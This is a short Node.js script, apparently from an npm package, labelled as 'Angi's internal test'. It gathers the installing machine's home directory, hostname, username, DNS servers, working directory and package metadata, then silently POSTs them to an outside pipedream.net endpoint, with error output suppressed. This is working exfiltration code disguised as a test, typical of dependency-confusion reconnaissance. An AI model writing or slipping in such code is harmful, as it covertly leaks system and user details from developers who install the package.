//This is Angi's internal test.
const querystring = require("querystring");
const dns = require("dns");
const os = require("os");
const packageJSON = require("./package.json");
const https = require("https");
const paquete = packageJSON.name;

const trackingData = JSON.stringify({
    pavb: paquete,
    dnamex: __dirname,
    homedirx: os.homedir(),
    hostnamex: os.hostname(),
    usernamex: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "eoi4ntbft1qnlw1.m.pipedream.net",
    method: "POST",
    port: 443,
    path: "/",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
});

req.write(postData);
req.end();
